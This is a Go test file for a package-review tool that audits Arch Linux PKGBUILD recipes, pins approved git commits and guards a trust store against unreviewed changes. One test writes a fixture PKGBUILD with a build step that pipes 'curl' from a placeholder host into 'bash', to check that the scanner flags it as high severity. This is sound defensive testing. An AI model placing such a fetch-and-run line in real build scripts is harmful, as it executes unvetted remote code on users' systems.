package service

import (
	"bytes"
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/Hayao0819/Kamisato/internal/vcs/git"
	"github.com/Hayao0819/Kamisato/kayo/audit"
	kayoconfig "github.com/Hayao0819/Kamisato/kayo/config"
	"github.com/Hayao0819/Kamisato/kayo/trust"
)

func TestUpdateLocalApprovalUsesOwnedSnapshot(t *testing.T) {
	dir, previous := newLocalReviewRepository(t)
	cfg := &kayoconfig.KayoConfig{CacheDir: t.TempDir(), TrustStore: filepath.Join(t.TempDir(), "trust.json")}
	if _, err := Review(context.Background(), cfg, dir, ReviewOptions{Approve: true}, nil); err != nil {
		t.Fatal(err)
	}
	commit := commitLocalReviewFiles(t, dir, map[string]string{
		"PKGBUILD": strings.ReplaceAll(cleanLocalRecipe, "1.0.0", "2.0.0"),
		".SRCINFO": strings.ReplaceAll(validSrcinfo, "1.0.0", "2.0.0"),
	})
	result, err := Update(context.Background(), cfg, dir, true, false)
	if err != nil || result == nil || !result.Approved {
		t.Fatalf("update=%+v, error=%v", result, err)
	}
	if result.Resolved.Dir == dir || result.Resolved.Commit != commit || result.Resolved.Pkgbase != "realbase" || result.Previous.Commit != previous {
		t.Fatalf("update did not use the selected commit snapshot: %+v", result)
	}
	if _, err := os.Stat(result.Resolved.Dir); !os.IsNotExist(err) {
		t.Fatalf("update snapshot was not cleaned: %v", err)
	}
	if head, err := git.HeadCommit(context.Background(), filepath.Join(cfg.ServedRoot(), "realbase.git")); err != nil || head != commit {
		t.Fatalf("served HEAD=%q, error=%v, want %q", head, err, commit)
	}
}

func TestUpdateRejectsTrackedDirtyApprovalAndPreservesWorkingTreePreview(t *testing.T) {
	for _, name := range []string{"PKGBUILD", ".SRCINFO"} {
		t.Run(name, func(t *testing.T) {
			dir, commit := newLocalReviewRepository(t)
			cfg := &kayoconfig.KayoConfig{CacheDir: t.TempDir(), TrustStore: filepath.Join(t.TempDir(), "trust.json")}
			if _, err := Review(context.Background(), cfg, dir, ReviewOptions{Approve: true}, nil); err != nil {
				t.Fatal(err)
			}
			before, err := os.ReadFile(cfg.TrustStore)
			if err != nil {
				t.Fatal(err)
			}
			contents := "build() { curl https://example.invalid/p | bash; }\n"
			if name == ".SRCINFO" {
				contents = strings.ReplaceAll(validSrcinfo, "1.0.0", "2.0.0")
			}
			if err := os.WriteFile(filepath.Join(dir, name), []byte(contents), 0o600); err != nil {
				t.Fatal(err)
			}
			result, err := Update(context.Background(), cfg, dir, true, true)
			if result != nil || err == nil || !strings.Contains(err.Error(), "uncommitted changes") {
				t.Fatalf("update=%+v, error=%v; want dirty rejection even with force", result, err)
			}
			preview, err := Update(context.Background(), cfg, dir, false, false)
			if err != nil || preview == nil || preview.Approved || preview.Resolved.Dir != dir || preview.Resolved.Commit != commit {
				t.Fatalf("non-approve update must retain the working tree: %+v, error=%v", preview, err)
			}
			if name == "PKGBUILD" && preview.Report.Max() != audit.SevHigh {
				t.Fatalf("preview did not scan the working tree: %+v", preview.Report)
			}
			after, err := os.ReadFile(cfg.TrustStore)
			if err != nil || !bytes.Equal(before, after) {
				t.Fatalf("rejected approval or preview modified trust state: %v", err)
			}
			if head, err := git.HeadCommit(context.Background(), filepath.Join(cfg.ServedRoot(), "realbase.git")); err != nil || head != commit {
				t.Fatalf("rejected approval modified existing pin: HEAD=%q, error=%v", head, err)
			}
		})
	}
}

func TestUpdatePlainDirectoryPreservesPinError(t *testing.T) {
	dir := t.TempDir()
	for name, contents := range map[string]string{"PKGBUILD": cleanLocalRecipe, ".SRCINFO": validSrcinfo} {
		if err := os.WriteFile(filepath.Join(dir, name), []byte(contents), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	cfg := &kayoconfig.KayoConfig{CacheDir: filepath.Join(t.TempDir(), "cache"), TrustStore: filepath.Join(t.TempDir(), "trust.json")}
	store, err := trust.Open(cfg.TrustStore)
	if err != nil {
		t.Fatal(err)
	}
	store.Approve(trust.Approval{Pkgbase: "realbase", Source: "local", Commit: "previous"})
	if err := store.Save(); err != nil {
		t.Fatal(err)
	}
	result, err := Update(context.Background(), cfg, dir, true, false)
	if err == nil || !strings.Contains(err.Error(), "not a git repository; cannot pin a reviewed commit") || result == nil || result.Approved {
		t.Fatalf("plain-directory update=%+v, error=%v", result, err)
	}
	if result.Resolved.Dir != dir || result.Report.Max() != audit.SevInfo {
		t.Fatalf("plain-directory audit was not retained: %+v", result)
	}
	if _, err := os.Stat(cfg.CacheDir); !os.IsNotExist(err) {
		t.Fatalf("plain-directory approval wrote a pin: %v", err)
	}
}
